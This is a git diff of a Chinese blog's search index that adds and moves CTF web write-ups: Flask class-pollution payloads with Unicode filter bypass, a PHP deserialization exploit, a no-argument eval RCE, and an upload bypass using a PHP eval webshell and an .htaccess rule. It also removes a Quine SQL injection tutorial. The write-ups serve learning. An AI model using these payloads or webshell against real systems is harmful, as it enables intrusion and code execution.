@@ -1,6 +1,48 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CISCN华东南WEB-Polluted</title>
+    <url>/category/CISCN%E5%8D%8E%E4%B8%9C%E5%8D%97WEB-Polluted/</url>
+    <content><![CDATA[<p>线下打的时候，没网，有些细节没弄好，最后没搓出来，有点可惜。</p>
+<p>环境搭建：</p>
+<p><img src="/pic/CISCN-WEB-Polluted/1.png" alt="img"></p>
+<p>给出了源代码:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for,request,render_template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_md5</span>():</span><br><span class="line">    random_string = os.urandom(<span class="number">16</span>)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> md5_hash.hexdigest()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">user_input</span>):</span><br><span class="line">    blacklisted_patterns = [<span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklisted_patterns:</span><br><span class="line">        <span class="keyword">if</span> re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">filter</span>(<span class="built_in">str</span>(request.data)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            merge(json.loads(request.data), Evil)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">templates</span>():</span><br><span class="line">    username = session.get(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    password = session.get(<span class="string">&quot;password&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">and</span> password:</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;adminer&quot;</span> <span class="keyword">and</span> password == app.secret_key:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;important.html&quot;</span>, flag=<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Hello,  This is the POLLUTED page.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>乍一看以为是原型链污染flask的secret_key后读取flag.</p>
+<p>构造原始的污染链子：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET_KEY&quot;</span>: <span class="string">&quot;Dragonkeep&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目对init等关键词进行了过滤，这里使用Unicode进行绕过。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;\u005F\u005F\u0069nit\u005F\u005F&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;\u005F\u005F\u0067lobals\u005F\u005F&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;\u0061pp&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;SECRET\u005FKEY&quot;</span>: <span class="string">&quot;Dragonkeep&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以在污染后对其session进行解密，看看是否成功污染。</p>
+<p><img src="/pic/CISCN-WEB-Polluted/2.png" alt="img"></p>
+<p><img src="/pic/CISCN-WEB-Polluted/3.png" alt="img"></p>
+<p>污染后再&#x2F;admin界面对username和password进行赋值,注意，这里它是从session进行读取username的，线下时候没注意看，以为是直接post提交，卡了很久（审计代码要认真！！）</p>
+<p>如果是使用bp发包的话，建议使用flask-session-cookie-manager伪造session，毕竟已经污染了SECRET_KEY，可以随意构造。</p>
+<p><img src="/pic/CISCN-WEB-Polluted/4.png" alt="img"></p>
+<p><img src="/pic/CISCN-WEB-Polluted/5.png" alt="img"></p>
+<p>发现渲染模板的方式和原本jinja<code>&#123;&#123;flag&#125;&#125;</code>的不一样,这时候需要污染它的渲染语法规则，在<a href="https://jinja.palletsprojects.com/en/3.1.x/api/#jinja2.Environment%E4%B8%AD%E6%9C%89%E4%BB%8B%E7%BB%8D%E3%80%82">https://jinja.palletsprojects.com/en/3.1.x/api/#jinja2.Environment中有介绍。</a></p>
+<p><img src="/pic/CISCN-WEB-Polluted/6.png" alt="img"></p>
+<p>在Flask下有个jinja_env中就包括这些语法规则，注意它是有缓存机制（线下没做出来，就因为这个）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;\u005F\u005F\u0069nit\u005F\u005F&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;\u005F\u005F\u0067lobals\u005F\u005F&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;\u0061pp&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;jinja\u005F\u0065nv&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;variable\u005Fstart\u005F\u0073tring&quot;</span>: <span class="string">&quot;[%&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;variable\u005Fend\u005F\u0073tring&quot;</span>: <span class="string">&quot;%]&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果发包到&#x2F;admin渲染了important.html之后，jinja的缓存机制会把这个模板的渲染方式加载到缓存，这时候如果再进行污染的话，只会对后面渲染的模板生效，一般解题的话，如果已经加载到缓存的话，可以直接重启容器来解决这个问题。</p>
+<p><img src="/pic/CISCN-WEB-Polluted/7.png" alt="img"></p>
+<p>整个步骤就是先污染SECRET_KEY，后再污染variable_start_string和variable_end_string，最后使用session访问&#x2F;admin即可拿到flag。</p>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/13072?time__1311=mqmxnDBDuDcAiQ3DsD7mN0=XxIQQWK7s4D&alichlgref=https://www.google.com.hk/#toc-13">https://xz.aliyun.com/t/13072?time__1311=mqmxnDBDuDcAiQ3DsD7mN0%3DXxIQQWK7s4D&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-13</a></p>
+<p><a href="https://tttang.com/archive/1876/#toc_jinja">https://tttang.com/archive/1876/#toc_jinja</a></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java反射</title>
     <url>/category/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h3 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h3><p>Java 反射是一种机制，允许在运行时检查、获取和操作类、接口、字段、方法等的信息。通过反射，你可以在编译时不知道类的具体信息的情况下，动态地获取并操作类的成员。Java 反射提供了一组类和接口，使得可以在运行时获取类的元数据，调用类的方法，访问类的字段，甚至创建新的类实例。</p>
@@ -298,6 +340,58 @@
       </tags>
   </entry>
   <entry>
+    <title>NewStart WEEK2 WEB</title>
+    <url>/category/NewStart%20WEEK2%20WEB/</url>
+    <content><![CDATA[<h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>控制台修改gameScore参数值，然后挂掉就行。</p>
+<p><img src="/pic/NewStartWEEK2WEB/image-20231008212646040.png" alt="image-20231008212646040"></p>
+<h4 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h4><p>SQLmap直接出</p>
+<p><img src="/pic/NewStartWEEK2WEB/image-20231008212757181.png" alt="image-20231008212757181"></p>
+<h4 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h4><p>反序列化，只要注意它是私有属性就行</p>
+<p>exp:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/NewStartWEEK2WEB/image-20231008222629661.png" alt="image-20231008222629661"></p>
+<h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h4><p>题目提示要扫，那就扫！！！</p>
+<p>dirsearch启动</p>
+<p><img src="/pic/NewStartWEEK2WEB/image-20231008223854603.png" alt="image-20231008223854603"></p>
+<p>扫出来发现<code>.git</code>无法直接访问，但是可以访问它目录下的其他文件，</p>
+<p>在<code>.git/COMMIT_EDITMSG</code>目录下发现<code> bo0g1pop.php</code></p>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到<code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;</code>这个经典正则，就知道考点是<strong>无参数读取文件</strong>。</p>
+<p>ban掉了<code>scandir</code>，考虑<code>getallheaders()</code></p>
+<p>用<code>print_r</code>代替<code>var_dump</code></p>
+<p>先查看一下getallheaders()数组下可控的http头。</p>
+<blockquote>
+<p>?star&#x3D;print_r(getallheaders());</p>
+</blockquote>
+<p><img src="/pic/NewStartWEEK2WEB/image-20231010220620310.png" alt="image-20231010220620310"></p>
+<p>这里<code>current</code>被ban了，用pos替代</p>
+<p><img src="/pic/NewStartWEEK2WEB/image-20231010220725892.png" alt="image-20231010220725892"></p>
+<p>虽然host可控，但是修改了就实例报错。。。。</p>
+<p>但是ua头可以随便修改，所以用next</p>
+<blockquote>
+<p><img src="/pic/NewStartWEEK2WEB/image-20231010221240463.png" alt="image-20231010221240463"></p>
+</blockquote>
+<h4 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h4><p>经测试发现，上传内容中对<code>&lt;?php</code>标签过滤了，采用长标签解析绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_GET[&#x27;a&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>改后缀为png</p>
+<p>再上传.htaccess文件，对png文件进行解析。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
+
+<p>再访问<code>upload/xxx.png</code>，就可以执行php代码了。</p>
+<p><img src="/pic/NewStartWEEK2WEB/image-20231016011954726.png" alt="image-20231016011954726"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP原生类的利用</title>
     <url>/category/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[<h3 id="适用类型"><a href="#适用类型" class="headerlink" title="适用类型"></a>适用类型</h3><p>在PHP反序列化中，没有POP链或者POP链构造到一半无法进行下去，使用原生类进行XSS等。</p>
@@ -382,58 +476,6 @@
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/9293">https://xz.aliyun.com/t/9293</a></p>
 <p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>NewStart WEEK2 WEB</title>
-    <url>/category/NewStart%20WEEK2%20WEB/</url>
-    <content><![CDATA[<h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>控制台修改gameScore参数值，然后挂掉就行。</p>
-<p><img src="/pic/NewStartWEEK2WEB/image-20231008212646040.png" alt="image-20231008212646040"></p>
-<h4 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h4><p>SQLmap直接出</p>
-<p><img src="/pic/NewStartWEEK2WEB/image-20231008212757181.png" alt="image-20231008212757181"></p>
-<h4 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h4><p>反序列化，只要注意它是私有属性就行</p>
-<p>exp:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&quot;nl /th1s_1s_fffflllll4444aaaggggg&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/pic/NewStartWEEK2WEB/image-20231008222629661.png" alt="image-20231008222629661"></p>
-<h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h4><p>题目提示要扫，那就扫！！！</p>
-<p>dirsearch启动</p>
-<p><img src="/pic/NewStartWEEK2WEB/image-20231008223854603.png" alt="image-20231008223854603"></p>
-<p>扫出来发现<code>.git</code>无法直接访问，但是可以访问它目录下的其他文件，</p>
-<p>在<code>.git/COMMIT_EDITMSG</code>目录下发现<code> bo0g1pop.php</code></p>
-<p>源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>看到<code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;</code>这个经典正则，就知道考点是<strong>无参数读取文件</strong>。</p>
-<p>ban掉了<code>scandir</code>，考虑<code>getallheaders()</code></p>
-<p>用<code>print_r</code>代替<code>var_dump</code></p>
-<p>先查看一下getallheaders()数组下可控的http头。</p>
-<blockquote>
-<p>?star&#x3D;print_r(getallheaders());</p>
-</blockquote>
-<p><img src="/pic/NewStartWEEK2WEB/image-20231010220620310.png" alt="image-20231010220620310"></p>
-<p>这里<code>current</code>被ban了，用pos替代</p>
-<p><img src="/pic/NewStartWEEK2WEB/image-20231010220725892.png" alt="image-20231010220725892"></p>
-<p>虽然host可控，但是修改了就实例报错。。。。</p>
-<p>但是ua头可以随便修改，所以用next</p>
-<blockquote>
-<p><img src="/pic/NewStartWEEK2WEB/image-20231010221240463.png" alt="image-20231010221240463"></p>
-</blockquote>
-<h4 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h4><p>经测试发现，上传内容中对<code>&lt;?php</code>标签过滤了，采用长标签解析绕过。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_GET[&#x27;a&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>改后缀为png</p>
-<p>再上传.htaccess文件，对png文件进行解析。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
-
-<p>再访问<code>upload/xxx.png</code>，就可以执行php代码了。</p>
-<p><img src="/pic/NewStartWEEK2WEB/image-20231016011954726.png" alt="image-20231016011954726"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
   </entry>
   <entry>
     <title>SPEL</title>
@@ -866,44 +908,6 @@ $argv,$argc在web模式下不适用
 ]]></content>
   </entry>
   <entry>
-    <title>学习Quino注入</title>
-    <url>/category/%E5%AD%A6%E4%B9%A0Quino%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h4 id="什么是Quine"><a href="#什么是Quine" class="headerlink" title="什么是Quine"></a>什么是Quine</h4><p><code>Quine</code>又称为自产生程序，<code>Quine注入</code>就是使用输入的SQL语句和输出的SQL相一致的技术，让查询语句的结果与输入语句相同来达到判断成功的效果。</p>
-<h4 id="replace函数"><a href="#replace函数" class="headerlink" title="replace函数"></a>replace函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">replace(object,search,replace)</span><br><span class="line">#object是原字符串，search是要替换的子串，replace是替换完后的子串</span><br></pre></td></tr></table></figure>
-
-<p>例如:</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> replace(&quot;dragonkeep&quot;,<span class="type">char</span>(<span class="number">100</span>),<span class="string">&#x27;D&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> replace(&quot;dragonkeep&quot;,<span class="type">char</span>(<span class="number">100</span>),<span class="string">&#x27;D&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Dragonkeep                          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
-
-<p>这里成功将字符<code>d</code>替换为<code>D</code>。</p>
-<h4 id="嵌套使用一下"><a href="#嵌套使用一下" class="headerlink" title="嵌套使用一下"></a>嵌套使用一下</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>,<span class="type">CHAR</span>(<span class="number">46</span>),<span class="string">&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> REPLACE(&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;,<span class="type">CHAR</span>(<span class="number">46</span>),&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
-
-<p>是不是傻了，有点像学完<code>1+1</code>就得会高数了(bushi)…</p>
-<p>简单剖析一下</p>
-<p>最外层执行<code>REPLACE</code>后，就变成：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> REPLACE(&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;,<span class="type">CHAR</span>(<span class="number">46</span>),&quot;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>不难发现最后的引号是双引号，跟原来的单引号不一致。目的只有一个就是让原语句跟输出语句一致。</p>
-<h4 id="解决引号的问题"><a href="#解决引号的问题" class="headerlink" title="解决引号的问题"></a>解决引号的问题</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">replace(<span class="string">&#x27;&quot;.&quot;&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>))</span><br></pre></td></tr></table></figure>
-
-<p>套上去后：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>看上去很长，其实就是递归思想，拆解一下就好理解</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">select</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> replace(replace(<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),<span class="string">&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
-
-<p>此时可以发现输入与输出保持一致了。这里的<code>char</code>函数和<code>0x、chr三个等价</code>替换。</p>
